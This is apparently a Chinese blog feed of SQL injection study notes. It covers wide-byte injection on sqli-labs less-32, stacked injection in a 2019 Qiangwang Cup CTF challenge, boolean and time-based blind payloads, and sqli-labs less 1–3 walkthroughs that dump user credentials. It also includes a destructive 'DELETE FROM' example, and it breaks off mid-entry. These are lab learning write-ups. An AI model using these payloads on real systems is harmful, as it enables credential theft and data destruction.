        <content type="html"><![CDATA[<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过sql注入防御。</p><h3 id="常见的字符集"><a href="#常见的字符集" class="headerlink" title="常见的字符集"></a>常见的字符集</h3><p>ascii编码：单字节编码</p><p>0x00 null<br>0x20<br>0x21 !<br>0x22 “<br>0x23 #<br>0x24 $<br>0x25 %<br>0x26 &amp;<br>0x27 ’<br>0x28 (<br>0x29)<br>0x2A *<br>0x2B +<br>0x2C ,<br>0x2D -<br>0x2E .<br>0x2F /<br>0x3A :<br>0x3B ;<br>0x3C &lt;<br>0x3D =<br>0x3E &gt;<br>0x3F ?<br>0x40 @<br>0x5B [<br>0x5C<br>0x5D ]<br>0x5E ^<br>0x5F _<br>0x60 `<br>0x7B {<br>0x7C |<br>0x7D }<br>0x7E ~</p><p>latin1编码：单字节编码</p><p>gbk编码：使用一字节和双字节编码，0x00-0x7F范围内是一位，和ascii保持一致。双字节的第一个字节范围是0x81-0xFE</p><p>utf-8编码：使用一至四字节编码，0x00-0x7F范围内是一位，和ascii保持一致。其他字符用二至四个字节变长表示。</p><h3 id="MySQL字符转换"><a href="#MySQL字符转换" class="headerlink" title="MySQL字符转换"></a>MySQL字符转换</h3><p>数据提交到mysql数据库，需要进行字符集的转换，使得mysql数据库可以对数据进行处理，这个过程一般有以下三个步骤：</p><p>收到请求，将请求数据从character_set_client -&gt;character_set_connection.</p><p>内部操作，将数据从character_set_connection  –&gt;表创建的字符集。</p><p>结果输出，将数据从表创建的字符集 –&gt;character_set_results。</p><p>当执行set names ”charset”，相当于执行</p><p>set character_set_client = charset</p><p>set character_set_connection = charset</p><p>set character_set_results = charset</p><p>client 指的是php程序</p><p>connection指的是php客户端与mysql服务器之间连接层</p><p>results 指的是mysql服务器返回给PHP客户端的结果</p><h3 id="sqli-labs-less-32"><a href="#sqli-labs-less-32" class="headerlink" title="sqli-labs/less-32"></a>sqli-labs/less-32</h3><p>1.查看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[&#x27;id&#x27;]);</span><br><span class="line">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line"></span><br><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;font color= &quot;#00FF00&quot;&gt;&#x27;;</span><br><span class="line">  echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>普通注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20230521112543826.png" alt="image-20230521112543826"></p><p>第一步：被check_addslashes函数转义</p><p><code>check_addslashes</code> 函数并不是完全安全的，因为它只是简单地添加反斜杠来转义特殊字符。</p><p>第二步：在执行sql查询之前，mysql_query(“SET NAMES gbk”);将MySQL的三个字符集设置为 gbk 编码</p><p>第三步：character_set_client告诉MySQL Server，传入的是gbk编码，也就是’被当做了%5C%27传入</p><p>第四步：character_set_client –&gt;character_set_connection编码完全一致，数据没有任何转换，所以输入是%5C%27,输出的是%5%27</p><p>第五步：character_set_connection  –&gt;table charset这里我们需要关注下使用的表的字符集。</p><p><img src="/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20230521203503187.png" alt="image-20230521203503187"></p><p>可以看到id参数没有设置编码方式，不会对%5C%27进行处理。在这里mysql服务器将查询语句执行，并返回结果。</p><p>执行的sql语句为：</p><p>$sql=“SELECT * FROM users WHERE id=‘1’’ LIMIT 0,1”;<br> ‘被转义无法进行注入</p><p>第六步：table charset –&gt;character_set_results字符集也设定为gbk，保证了输出内容没有乱码。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆叠注入</title>
      <link href="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>mysql数据库sql语句的默认结尾是以 <strong>;</strong> 结尾，在执行多条sql语句时要使用结束符隔开，那么在 <strong>；</strong>结束一条sql语句后继续构造下一条语句会不会一起执行？因此这个想法就造成了堆叠注入。</p><p>而union injection(联合注入)也是将两条语句合并在一起，两者有什么区别嘛？</p><p>区别就在于union或者union all 执行的语句类型有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户输入：1; DELETE FROM products</span><br><span class="line">服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products</span><br><span class="line">当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</span><br></pre></td></tr></table></figure><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>1.先判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202114862.png" alt="image-20230516202114862"></p><p>正常显示，再试试别的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202210837.png" alt="image-20230516202210837"></p><p>出现错误，说明存在注入，看一下报错信息，没有显示有用的信息，在试试万能注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1;#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202509807.png" alt="image-20230516202509807"></p><p>2.可以判断一下字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3#    </span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516203725859.png" alt="image-20230516203725859"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516204018371.png" alt="image-20230516204018371"></p><p>说明字段数为2</p><p>然后我们尝试一下用联合注入看一下</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516204230761.png" alt="image-20230516204230761"></p><p>perg_math函数是正则函数，从报错信息我们发现select被正则匹配过滤掉了</p><p>我们再试试别的方法</p><p>3.查看数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516205244193.png" alt="image-20230516205244193"></p><p>执行上面的语句，我们发现第一句满足条件的语句之后，还能在执行下一条，没有条件限制</p><p>4.查看表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables from supersqli;#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516210127648.png" alt="image-20230516210127648"></p><p><strong>注意：如果查看的表名是字符串，就需要加上反引号(`),英文输入法下按esc下面那个键</strong></p><p>查看字符串表中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;use supersqli;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516210857498.png" alt="image-20230516210857498"></p><p>再查看words表看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;use supersqli;show columns from words;#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516211257044.png" alt="image-20230516211257044"></p><p>varchar()是一种比char灵活的数据类型，是可以保存可变长的字符串</p><p>根据两个表的情况结合实际查询出结果,判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构也是id（数字）和data（字符串），查询传入参数也就是赋值给了id</p><h2 id="rename和alert用法"><a href="#rename和alert用法" class="headerlink" title="rename和alert用法"></a>rename和alert用法</h2><p>rename：修改一个或者多个表的名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename table old_table_name to new_table_name;</span><br></pre></td></tr></table></figure><p>alter :向表中添加字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table [表名] add [列名] 类型</span><br></pre></td></tr></table></figure><p>保留old和new列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">列名：a ----&gt;b 列类型</span><br><span class="line">     alter table t1 change a b integer;</span><br></pre></td></tr></table></figure><p>改名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table `words` to words2;rename table `1919810931114514` to words;alter table words change flag id varchar(100);show tables;#</span><br></pre></td></tr></table></figure><p>更改表名列名</p><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p><p><code>show tables</code>主要看看改成功没有，这里改表名要有顺序，如果先改数字表，那就出现两个words表，导致语句不能执行，所以需要先改words表名为其他名字，然后修改数字表为words；避免因为名字而发生命令冲突</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516214010853.png" alt="image-20230516214010853"></p><p>最后用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1#</span><br></pre></td></tr></table></figure><p>看回显数据</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516214204616.png" alt="image-20230516214204616"></p><p>得到flag</p><p>这个大佬的wp不错！！！</p><p><a href="https://ttoc.fun/2022/06/21/buuctf-wp/">https://ttoc.fun/2022/06/21/buuctf-wp/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>布尔盲注和时间盲注</title>
      <link href="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
      <url>/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是盲注"><a href="#什么是盲注" class="headerlink" title="什么是盲注"></a>什么是盲注</h2><p>盲注就是在sql注入过程中，sql语句执行select之后，可能由于网站方法代码的限制或者apache等解析器配置了不回显数据，造成在select数据之后不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个判断过程称为盲注。</p><p>简单理解就是在前端页面没有显示位，不能返回sql语句执行错误的信息，输入正确和错误返回的信息都是一致的，这个时候我们需要使用页面的正常和不正常显示来进行sql注入。</p><h2 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h2><p>布尔盲注</p><p>时间盲注</p><h2 id="利用盲注的前提条件"><a href="#利用盲注的前提条件" class="headerlink" title="利用盲注的前提条件"></a>利用盲注的前提条件</h2><p>首先页面没有显示位（如果有显示位可以选择union联合查询），并且没有返回sql语句的执行错误信息。</p><h2 id="盲注的优缺点"><a href="#盲注的优缺点" class="headerlink" title="盲注的优缺点"></a>盲注的优缺点</h2><p>优点：不需要显示位和出错信息。</p><p>缺点：速度慢，耗费时间长（可以使用bp等工具）</p><h2 id="布尔类型的盲注"><a href="#布尔类型的盲注" class="headerlink" title="布尔类型的盲注"></a>布尔类型的盲注</h2><ol><li>left(database(),1)&gt;’s’     //left() 函数</li></ol><p>database()显示数据库名称，left(a,b)从左侧截取a的前b位</p><ol start="2"><li> ascii(substr((select table_name information_schema.tables where tables_schema=database() limit 0,1 ),1,1))=101 –+          //substr()函数，ascii函数()</li></ol><p>   substr(a,b,c)从b位置开始，截取字符串a的c长度。ascii()将某个字符转换为ascii值</p><ol start="3"><li><p>ascii(substr((select database()),1,1))=98</p></li><li><p>ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&gt;98%23           //ord()函数，mid()函数</p><p>mid(a,b,c)从位置b开始，截取a字符串的c位</p><p>ord()函数同ascii(),将字符转为ascii值</p></li><li><p>regexp正则注入</p><p>用法介绍：select user() regexp ‘^[a-z]’;</p><p>正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。第二位可以用select user() regexp ‘^ro’ 来进行。</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514160206799.png" alt="image-20230514160206799"></p></li></ol><p>当正确的时候显示结果为1，不正确的时候显示结果为0</p><p>6.like匹配注入</p><p>和上述的正则类似，mysql在匹配的时候我们可以用like 进行匹配。</p><p>用法：select user()  like ‘ro%’</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514163811743.png" alt="image-20230514163811743"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5)%23)    //if判断语句，条件为假，条件为假，执行sleep</p><p>union select if(substring(current,1,1)=char(119),benchmark(5000000,encode(‘msg’,’by 5 seconds’)),null)  </p><p>from (select database() as current) as tbl;</p><p>//benchmark(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的CPU资源。</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514173225035.png" alt="image-20230514173225035"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs靶场</title>
      <link href="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="几个常用函数"><a href="#几个常用函数" class="headerlink" title="几个常用函数"></a>几个常用函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.version() --mysql版本</span><br><span class="line">2.user()    --数据库用户名</span><br><span class="line">3.database() --数据库名</span><br><span class="line">4.@@datadir  --数据库路径</span><br><span class="line">5.@@version_compile_os --操作系统</span><br></pre></td></tr></table></figure><h3 id="用于尝试的闭合语句"><a href="#用于尝试的闭合语句" class="headerlink" title="用于尝试的闭合语句"></a>用于尝试的闭合语句</h3><p>–+可以用 #替换，url提交过程中url编码后的#为%23， - 和# 为注释符，把后面语句注释掉，使其无法执行。空格url转义成%20，  ‘ 转义成%27</p><p>有时用–+，而不是#的原因是,http 无法解释#，所以用–+来代替</p><p>–+中起到注释作用其实是–，但是如果单纯的 – 会和后面的内容连上从而导致sql语句出错，所以有了 + 会解释为空格，从而避免报错</p><p>故</p><p>–%20 &lt;==&gt; –+</p><h4 id="sql-labs靶场less1"><a href="#sql-labs靶场less1" class="headerlink" title="sql-labs靶场less1"></a>sql-labs靶场less1</h4><p>1.题目提示输入ID进行get传参，但需要注意的是这个靶场貌似是不区分大小写的，我用大写ID进行传参是没有任何回显的，只有输入id才可以传参，这点需要注意。</p><p>‘ 报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#尝试单引号注入，看回显信息；发现是字符型后台数据库通过单引号进行闭合</span><br><span class="line">?id=1&#x27; </span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230717211409346.png" alt="image-20230717211409346"></p><p>2.尝试使用 # 注释不起作用。采用%23或者–+注释都可以，需要注意</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  --+</span><br><span class="line">?id=1&#x27; #</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230717211829588.png" alt="image-20230717211829588"></p><p>3.进一步尝试 输入 id=1’ –+ 发现回显正常</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718204259099.png" alt="image-20230718204259099"></p><p>4.用order by 判断该语句有几列数据 ?id=1’ order by 3 –+<br> order by 3 回显正常 order by 4 显示错误 证明有三列数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+  正常</span><br><span class="line">?id=1&#x27; order by 4 --+  报错</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205559129.png" alt="image-20230718205559129"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205438777.png" alt="image-20230718205438777"></p><p>5.于是使用 函数查询，此时要将id=1改为一个数据库不存在的数值 比如-1，给后面查询语句留显示位。此时注入语句为： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205841661.png" alt="image-20230718205841661"></p><p>如图可知显示位为2，3位。</p><p>6.然后在2，3位选择一位或者两位 查询数据库<br> 首先查询数据库名称<br> 查询语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1’ union select 1,2,database() --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718210316321.png" alt="image-20230718210316321"></p><p>可以查看到 数据库名称为security</p><p>7.继续查看表名</p><p>通过group_concat函数开始手工报他的表名；看看数据库中都有哪些表</p><p><strong>information_schema.tables 表示元数据下的tables表</strong></p><p><strong>where+条件</strong></p><blockquote><p>group_concat(table_name)表示将查询到的结果连接起来</p><p>下方payload的意思是：查询information)_schema数据库下的tables表且table_schema字段内容是security的所有table_name的内容</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718212438030.png" alt="image-20230718212438030"></p><p> 可以见到表名有emails,referers,uagents,users</p><p>8.因为sql注入主要是查看数据库中有用信息，而这个users 这个表 看起来存有敏感信息，于是我们继续查看users 表中信息。查看users表中的列名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name =&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718212951955.png" alt="image-20230718212951955"></p><p>可以查看到user中有三个列名id 、username、password</p><p>9.最后查找该表中usename、password的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718213610162.png" alt="image-20230718213610162"></p><p>得到所有的数据，注入完成</p><h4 id="sql-labs靶场less2"><a href="#sql-labs靶场less2" class="headerlink" title="sql-labs靶场less2"></a>sql-labs靶场less2</h4><p>tips：可以打开每一关的源码，在该位置添加一句代码方便做题分析，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo&quot;sql里面执行的是&quot;.$sql.&quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225159607.png" alt="image-20230512225159607"></p><p>1.判断注入类型</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225353576.png" alt="image-20230512225353576"></p><p>可以知道是数值型</p><p>2.判断字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 4 不正常</span><br><span class="line">?id=1 order by 3 正常</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225530782.png" alt="image-20230512225530782"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225927074.png" alt="image-20230512225927074"></p><p>可以确定有三列</p><p>3.判断可以回显的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513193541123.png" alt="image-20230513193541123"></p><p>4.判断数据库名和版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),version()</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513194524358.png" alt="image-20230513194524358"></p><p>5.获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195104430.png" alt="image-20230513195104430"></p><p>6.获取列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195526249.png" alt="image-20230513195526249"></p><p>7.获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,username,password from security.users limit 0,1 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195823876.png" alt="image-20230513195823876"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195921714.png" alt="image-20230513195921714"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513200006154.png" alt="image-20230513200006154"></p><p>第n条…..依次类推limit n，1</p><h4 id="sql-labs靶场less3"><a href="#sql-labs靶场less3" class="headerlink" title="sql-labs靶场less3"></a>sql-labs靶场less3</h4><p>今天浅浅复习一下</p><p>1.判断注入点，</p><p>输入？id=1 显示正常 </p><p>​     ？id=1’ 不正常  说明存在注入</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513221043279.png" 